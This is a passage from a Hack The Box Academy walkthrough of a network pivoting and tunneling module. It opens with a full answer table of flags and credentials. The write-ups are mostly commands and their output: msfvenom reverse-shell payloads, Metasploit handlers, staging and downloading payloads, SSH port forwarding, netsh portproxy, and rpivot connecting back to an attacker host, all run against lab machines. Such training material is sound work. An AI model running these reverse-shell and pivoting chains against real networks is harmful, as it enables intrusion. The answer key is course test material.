| Section | Question Number | Answer |
| --- | --- | --- |
| The Networking Behind Pivoting | Question 1 | eth0 |
| The Networking Behind Pivoting | Question 2 | tun0 |
| The Networking Behind Pivoting | Question 3 | 178.62.64.1 |
| Dynamic Port Forwarding with SSH and SOCKS Tunneling | Question 1 | 3 |
| Dynamic Port Forwarding with SSH and SOCKS Tunneling | Question 2 | N1c3Piv0t |
| Remote/Reverse Port Forwarding with SSH | Question 1 | 172.16.5.129 |
| Remote/Reverse Port Forwarding with SSH | Question 2 | 0.0.0.0 |
| Meterpreter Tunneling & Port Forwarding | Question 1 | 172.16.5.19,172.16.5.129 |
| Meterpreter Tunneling & Port Forwarding | Question 2 | 172.16.5.0/255.255.254.0 |
| Socat Redirection with a Reverse Shell | Question 1 | False |
| Socat Redirection with a Bind Shell | Question 1 | windows/x64/meterpreter/bind\_tcp |
| Web Server Pivoting with Rpivot | Question 1 | Attack Host |
| Web Server Pivoting with Rpivot | Question 2 | Pivot Host |
| Web Server Pivoting with Rpivot | Question 3 | I\_L0v3\_Pr0xy\_Ch@ins |
| Port Forwarding with Windows: Netsh | Question 1 | Jim Flipflop |
| DNS Tunneling with Dnscat2 | Question 1 | AC@tinth3Tunnel |
| SOCKS5 Tunneling with Chisel | Question 1 | Th3$eTunne1$@rent8oring! |
| ICMP Tunneling with SOCKS | Question 1 | N3Tw0rkTunnelV1sion! |
| RDP and SOCKS Tunneling with SocksOverRDP | Question 1 | H0pping@roundwithRDP! |
| Skills Assessment | Question 1 | webadmin |
| Skills Assessment | Question 2 | mlefay:Plain Human work! |
| Skills Assessment | Question 3 | 172.16.5.35 |
| Skills Assessment | Question 4 | S1ngl3-Piv07-3@sy-Day |
| Skills Assessment | Question 5 | vfrank |
| Skills Assessment | Question 6 | N3tw0rk-H0pp1ng-f0R-FuN |
| Skills Assessment | Question 7 | 3nd-0xf-Th3-R@inbow! |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# The Networking Behind Pivoting

## Question 1

### "Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?"

Students will find out when referring to the "Using ifconfig" code block that the `eth0` NIC is assigned a public IP address of `134.122.100.200`:

![[HTB Solutions/CPTS/z. images/3068d10a9f1eb72fdf0fd6ccafe3422b_MD5.jpg]]

Answer: `eth0`

# The Networking Behind Pivoting

## Question 2

### "Reference the Routing Table on Pwnbox output showing in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?"

Students will find out when referring to the "Routing Table on Pwnbox" code block that there's an entry in the routing table to the destination network `10.129.0.0` where the traffic goes out via `tun0`:

![[HTB Solutions/CPTS/z. images/ddea29b7de55ea0f99a1d3e9b3072023_MD5.jpg]]

Answer: `tun0`

# The Networking Behind Pivoting

## Question 3

### "Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?"

Students will find out when referring to the "Routing Table on Pwnbox" code block output that there is an entry in the routing table called `default` with its gateway being `178.62.64.1`, thus, since there is no explicit/predetermined route for packets that are destined for `www.hackthebox.com`, the gateway of the default route (also known as the gateway of last resort) will be used:

![[HTB Solutions/CPTS/z. images/64edebf04012f53faae2f1fd214382ca_MD5.jpg]]

Answer: `178.62.64.1`

# Dynamic Port Forwarding with SSH and SOCKS Tunneling

## Question 1

### "You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many interfaces does the target web server have? (Including the loopback interface)"

After spawning the target machine, students need to connect to it with SSH using the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh ubuntu@10.129.144.70

The authenticity of host '10.129.144.70 (10.129.144.70)' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.144.70' (ECDSA) to the list of known hosts.
ubuntu@10.129.144.70's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

ubuntu@WEB01:~$
```

Students then need to use `ifconfig` to list out the network interfaces, which they will find to be three:

Code: shell

```shell
ifconfig
```

```
ubuntu@WEB01:~$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
<SNIP>
ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
<SNIP>
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
<SNIP>
```

Answer: `3`

# Dynamic Port Forwarding with SSH and SOCKS Tunneling

## Question 2

### "Apply the concepts taught in this section to pivot to the internal network and use RDP to take control of the Windows target. Submit the contents of Flag.txt located on the Desktop."

After spawning the target machine, students need to connect to it with SSH using dynamic port forwarding utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh -D 9050 ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 ubuntu@10.129.144.70

ubuntu@10.129.144.70's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

ubuntu@WEB01:~$ 
```

Students then need to confirm that on `Pwnbox`/`PMVPN`, the `proxychains.conf` file has the `SOCKS4 127.0.0.1 9050` entry:

Code: shell

```shell
tail -4 /etc/proxychains.conf
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

Subsequently, students need to connect through the target pivot host to the DC on the internal network from `Pwnbox`/`PMVPN`, utilizing the credentials `victor:pass@123`:

Code: shell

```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

ProxyChains-3.1 (http://proxychains.sf.net)
[14:59:18:589] [7321:7322] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 172.16.5.19:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.local
	Subject:     CN = DC01.inlanefreight.local
	Issuer:      CN = DC01.inlanefreight.local
	Thumbprint:  42:73:b6:6e:c8:8e:af:88:90:d9:32:87:86:b6:20:7b:5a:16:7d:33:5b:e0:a2:51:d4:14:a8:bf:75:1b:45:ab
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

At last, once the `xfreerdp` connection is established, students will find the flag file on the Desktop directory, with its content being `N1c3Piv0t`:

![[HTB Solutions/CPTS/z. images/09b053f5d24d0cf13864043637964c28_MD5.jpg]]

Answer: `N1c3Piv0t`

# Remote/Reverse Port Forwarding with SSH

## Question 1

### "Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)"

From the reading of the module's section, students will know that the Ubuntu server Pivot host has an internal IP address of 172.16.5.129. However, below are the steps that students should take to obtain a reverse shell from the Windows target.

Students first need to create a Windows HTTPS reverse shell payload using `msfvenom` on `Pwnbox`/`PMVPN`:

Code: shell

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupScript.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 741 bytes
Final size of exe file: 7168 bytes
Saved as: backupScript.exe
```

Then, students need to configure and start a `msfconsole` multi-handler, after setting the payload to be identical to the one used in the `msfvenom` payload, along with `LHOST` and `LPORT` options:

Code: shell

```shell
sudo msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo msfconsole -q

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8000
LPORT => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

From `Pwnbox`/`PMVPN`, students need to transfer the `msfvenom` payload to the pivot (Ubuntu server) host, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
scp backupscript.exe ubuntu@STMIP:~/
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp backupscript.exe ubuntu@10.129.228.103:~/

ubuntu@10.129.228.103's password: 
backupscript.exe                              100% 7168    77.3KB/s   00:00
```

Subsequently, from Pwnbox/`PMVPN`, students need to use SSH to connect to the pivot host (Ubuntu server) using dynamic port forwarding, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh -D 9050 ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 ubuntu@10.129.228.103

ubuntu@10.129.228.103's password: 

Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$ ls
backupscript.exe
```

From within the Ubuntu server, students need to start a Python web server to serve up the `msfvenom` payload:

Code: shell

```shell
python3 -m http.server 8123
```

```
ubuntu@WEB01:~$ python3 -m http.server 8123

Serving HTTP on 0.0.0.0 port 8123 (http://0.0.0.0:8123/) ...
```

From `Pwnbox`/`PMVPN`, students need to connect to the Windows target (with the credentials being `victor:pass@123`), which resides on the internal network, utilizing the same pivot technique taught in the previous "Remote/Reverse Port Forwarding with SSH" section:

Code: shell

```shell
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

ProxyChains-3.1 (http://proxychains.sf.net)
[15:02:07:519] [3249:3250] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 172.16.5.19:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.local
	Subject:     CN = DC01.inlanefreight.local
	Issuer:      CN = DC01.inlanefreight.local
	Thumbprint:  07:5d:3e:b7:27:4b:83:87:d3:68:b6:90:fc:0e:26:67:c3:6c:13:f0:b8:0f:c1:1e:51:05:2c:3f:f5:4d:54:2e
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

![[HTB Solutions/CPTS/z. images/19941a4de59b38a994f8031d75c87ea1_MD5.jpg]]

Once connected to the Windows machine successfully, students need to run `PowerShell` as Administrator:

![[HTB Solutions/CPTS/z. images/27ce9a11ec597d4d37fc21aa01b1d884_MD5.jpg]]

Subsequently, students need to download the `msfvenom` payload from the Ubuntu pivot host (which has a Python web server up and listening on port 8123), using the IP address of the `ens224` interface (i.e., `172.16.5.129`):

Code: powershell

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\\backupscript.exe"
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\\backupscript.exe"
```

From Pwnbox/`PMVPN`, students need to perform an SSH remote port forward, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1k  25 Mar 2021

<SNIP>

debug1: Next authentication method: password
ubuntu@10.129.202.64's password: 
debug1: Authentication succeeded (password).
Authenticated to 10.129.202.64 ([10.129.202.64]:22).
debug1: Remote connections from 172.16.5.129:8080 forwarded to local address 0.0.0.0:8000
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Remote: Forwarding listen address "172.16.5.129" overridden by server GatewayPorts
debug1: remote forward success for: listen 172.16.5.129:8080, connect 0.0.0.0:8000
```

Now, students will be able to forward connections from the pivot host to the `msfconsole` listener. Thus, at last, students now need to execute the `msfvenom` payload that is on the Windows target to receive a shell back through the pivot host on the `msfconsole` listener:

![[HTB Solutions/CPTS/z. images/843fb35585a9dfaaab0273604a82270d_MD5.jpg]]

Answer: `172.16.5.129`

# Remote/Reverse Port Forwarding with SSH

## Question 2

### "What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)"

From the reading of the module's section and the usage of `0.0.0.0` as the value for `LHOST` when using the `multi/handler` module of `msfconsole`, students will know that the special IP address `0.0.0.0` will ensure that the handler is listening on all IP addresses assigned to the host.

Answer: `0.0.0.0`

# Meterpreter Tunneling & Port Forwarding

## Question 1

### "What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)"

Students first need to create a Linux reverse TCP shell payload using `msfvenom` on Pwnbox/`PMVPN`:

Code: shell

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=PWNIP LPORT=PWNPO -f elf -o reverseShell
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8080 -f elf -o reverseShell

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: reverseShell
```

Subsequently, students need to start a `msfconsole` `multi handler`, specifying the payload and port to match the ones used in the `msfvenom` payload:

Code: shell

```shell
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT PWNPO
run
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8080
```

Thereafter, students need to transfer the `msfvenom` payload to the Ubuntu pivot host, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
scp reverseShell ubuntu@STMIP:~/
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp reverseShell ubuntu@10.129.104.197:~/

ubuntu@10.129.104.197's password: 
reverseShell
```

Students then need to connect to the Ubuntu pivot host using SSH, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh ubuntu@10.129.104.197

ubuntu@10.129.104.197's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$
```

Once successfully connected to the pivot host, students need to make the `msfvenom` payload executable and then run it:

Code: shell

```shell
chmod +x reverseShell
./reverseShell
```

```
ubuntu@WEB01:~$ chmod +x reverseShell 
ubuntu@WEB01:~$ ./reverseShell 
```

Students will notice that a new `meterpreter` session has opened on their `multi/handler` listener module:

![[HTB Solutions/CPTS/z. images/54ebf4d761da5a062fa8cd0c09a3fc24_MD5.jpg]]

Thus, they need to perform a ping sweep against the `172.16.5.0/23` network, choosing any technique that was demonstrated in the module's section. The Linux for-loop method will be used. Students will find that the two IP addresses are `172.16.5.19` and `172.16.5.129`.:

Code: shell

```shell
shell
bash -i
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

```
meterpreter > shell

Process 3006 created.
Channel 330 created.
bash -i                                                                      
ubuntu@WEB01:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.378 ms
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.032 ms
```

Answer: `172.16.5.19,172.16.5.129`

# Meterpreter Tunneling & Port Forwarding

## Question 2

### "Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format:x.x.x.x/x.x.x.x)"

Students first need to create a Linux reverse TCP shell payload using `msfvenom` on Pwnbox/`PMVPN`:

Code: shell

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=PWNIP LPORT=PWNPO -f elf -o reverseShell
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=8080 -f elf -o reverseShell

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: reverseShell
```

Subsequently, students need to start an `msfconsole` `multi handler`, specifying the payload and port to match the ones used in the `msfvenom` payload:

Code: shell

```shell
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT PWNPO
run
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfconsole -q

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8080
```

Thereafter, students need to transfer the `msfvenom` payload to the Ubuntu pivot host, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
scp reverseShell ubuntu@STMIP:~/
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp reverseShell ubuntu@10.129.104.197:~/

ubuntu@10.129.104.197's password: 
reverseShell
```

Students then need to connect to the Ubuntu pivot host using SSH, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh ubuntu@10.129.104.197

ubuntu@10.129.104.197's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$
```

Once successfully connected to the pivot host, students need to make the `msfvenom` payload executable and then run it:

Code: shell

```shell
chmod +x reverseShell
./reverseShell
```

```
ubuntu@WEB01:~$ chmod +x reverseShell 
ubuntu@WEB01:~$ ./reverseShell 
```

Students will notice that a new `meterpreter` session has opened on their `multi/handler` listener module:

![[HTB Solutions/CPTS/z. images/54ebf4d761da5a062fa8cd0c09a3fc24_MD5.jpg]]

Afterward, students need to background the `meterpreter` session and configure the `auxiliary/server/socks_proxy` module:

Code: shell

```shell
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run
```

```
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy 
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
VERSION => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

Students need to make sure that the following `Socks4` entry is present in the `/etc/proxychains.conf` file:

Code: shell

```shell
Socks4 127.0.0.1 9050
```

Then, from Pwnbox/`PMVPN`, students need to attach back to their meterpreter session and run `autoroute` on the `172.16.5.0/23` subnet:

Code: shell

```shell
sessions -i 1
run autoroute -s 172.16.5.0/23
```

```
msf6 post(multi/manage/autoroute) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.106.254
[*] Use the -p option to list all active routes
```

From the output of `autoroute`, students will know that `172.16.5.0/255.255.254.0` allows `172.16.5.19` to be reachable from the attack host.

Answer: `172.16.5.0/255.255.254.0`

# Socat Redirection with a Reverse Shell

## Question 1

### "SSH Tunneling is required with Socat. True or False?"

`False`; from the reading of the module's section, students will know that SSH tunneling is not required with `Socat`:

![[HTB Solutions/CPTS/z. images/2069eb5b6007a729bc4eada4393c38be_MD5.jpg]]

Answer: `False`

# Socat Redirection with a Bind Shell

## Question 1

### "What Meterpreter payload did we use to catch our bind shell session (Submit the full path as the answer)"

From the reading of the module's section, students will know that the `windows/x64/meterpreter/bind_tcp` payload was used to catch the bind shell session:

![[HTB Solutions/CPTS/z. images/507ca0aff69d534548c04fe09e17cef0_MD5.jpg]]

Answer: `windows/x64/meterpreter/bind_tcp`

# Web Server Pivoting with Rpivot

## Question 1

### "From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer."

From the reading of the module's section, students will know that server.py needs to be run from the `Attack Host`:

![[HTB Solutions/CPTS/z. images/7d1d3aede03d51d83dd68d1ca065691b_MD5.jpg]]

Answer: `Attack Host`

# Web Server Pivoting with Rpivot

## Question 2

### "From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer."

From the reading of the module's section, students will know that client.py needs to be run from the `Pivot Host`:

![[HTB Solutions/CPTS/z. images/cd8d85964eda33ffc635e9dafaf83d68_MD5.jpg]]

Answer: `Pivot Host`

# Web Server Pivoting with Rpivot

## Question 3

### "Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home pages as the answer."

Students first need to start the `rpivot` server using `server.py` on `Pwnbox`/`PMVPN`:

Code: shell

```shell
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

```
┌─[us-academy-1]─[10.10.14.22]─[htb-ac413848@pwnbox-base]─[~/rpivot]
└──╼ [★]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Subsequently, students need to transfer the `rpivot` repository cloned from GitHub to the Ubuntu pivot host, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
scp -r rpivot ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.22]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp -r rpivot ubuntu@10.129.202.64:~/

ubuntu@10.129.202.64's password: 
applypatch-msg.sample  100%  478     4.7KB/s   00:00    
commit-msg.sample      100%  896     8.9KB/s   00:00    

<SNIP>
```

Students then need to connect to the Ubuntu pivot host using SSH, utilizing the credentials `ubuntu:HTB_@cademy_stdnt!`:

Code: shell

```shell
ssh ubuntu@STMIP
```

```
┌─[us-academy-1]─[10.10.14.22]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh ubuntu@10.129.202.64

ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

<SNIP>

ubuntu@WEB01:~$
```

Once successfully connected to the pivot host, students need to run "client.py" to connect to the `rpivot` server that is running on Pwnbox/`PMVPN`:

Code: shell

```shell
python2.7 client.py --server-ip PWNIP --server-port 9999
```

```
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.22 --server-port 9999

Backconnecting to server 10.10.14.22 port 9999
```

Students need to make sure that the following Socks4 entry is present in the `/etc/proxychains.conf` file:

Code: shell

```shell
Socks4 127.0.0.1 9050
```

At last, from Pwnbox/`PMVPN`, students need to use `proxychains` to open Firefox and browse the root web page of the web server on port 80 of the internal network target `172.16.5.135`:

![[HTB Solutions/CPTS/z. images/7e091f4f6eff91cd57ea01619b3169a6_MD5.jpg]]

Students will find the flag at the top of the web page.

Answer: `I_L0v3_Pr0xy_Ch@ins`

# Port Forwarding with Windows: Netsh

## Question 1

### "Using the concepts covered in this section, take control of the DC using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123)."

From Pwnbox/`PMVPN`, students first need to connect to the spawned Windows target using `xfreerdp`, utilizing the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.108.1 /u:htb-student /p:HTB_@cademy_stdnt!

<SNIP>

Certificate details for 10.129.108.1:3389 (RDP-Server):
	Common Name: OFFICEMANAGER
	Subject:     CN = OFFICEMANAGER
	Issuer:      CN = OFFICEMANAGER
	Thumbprint:  a0:7a:87:4f:ed:ba:79:8f:54:df:d1:6b:29:64:4e:43:ad:9e:f4:b5:78:60:fa:4d:18:da:68:2e:97:5a:10:9e
The above X.509 certificate could not be verified, possibly because you do not have the CA certificate in your certificate store, or the certificate has expired. Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

![[HTB Solutions/CPTS/z. images/37760de679bae1967dbc0674cd62c5ad_MD5.jpg]]

After connecting successfully, students need to run CMD as Administrator:

![[HTB Solutions/CPTS/z. images/95d3600f922f05a94df72365a2cca4cd_MD5.jpg]]

From the privileged CMD session, students need to use `netsh.exe` to create a port forwarding rule to allow connections to pass through the pivot host (i.e., the Windows spawned target) to the DC (172.16.5.19) on the internal network:

Code: shell

```shell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=STMIP connectport=3389 connectaddress=172.16.5.19
```

```
C:\Windows\system32>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.108.1 connectport=3389 connectaddress=172.16.5.19
```

Thereafter, from Pwnbox/`PMVPN`, students need to use `xfreerdp` to connect to the DC on the internal network, utilizing the credentials `victor:pass@123`:

Code: shell

```shell
xfreerdp /v:STMIP:8080 /u:victor /p:pass@123
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.108.1:8080 /u:victor /p:pass@123

<SNIP>

Certificate details for 10.129.108.1:8080 (RDP-Server):
	Common Name: DC01.inlanefreight.local
	Subject:     CN = DC01.inlanefreight.local
	Issuer:      CN = DC01.inlanefreight.local
	Thumbprint:  8e:1e:dd:f6:65:fc:20:51:07:5a:37:be:81:ef:ab:f2:6e:b2:ef:78:da:b4:d9:6e:0b:1c:78:e3:fa:48:74:88
The above X.509 certificate could not be verified, possibly because you do not have the CA certificate in your certificate store, or the certificate has expired. Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Once connected successfully, students need to open the "Approved Vendors" folder on the desktop and open the file within it to find the name of the approved contact:

![[HTB Solutions/CPTS/z. images/038976f133b6aba4effebdbde65c0f09_MD5.jpg]]

Answer: `Jim Flipflop`

# DNS Tunneling with Dnscat2

## Question 1

### "Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\\Users\\htb-student\\Documents\\flag.txt as the answer"

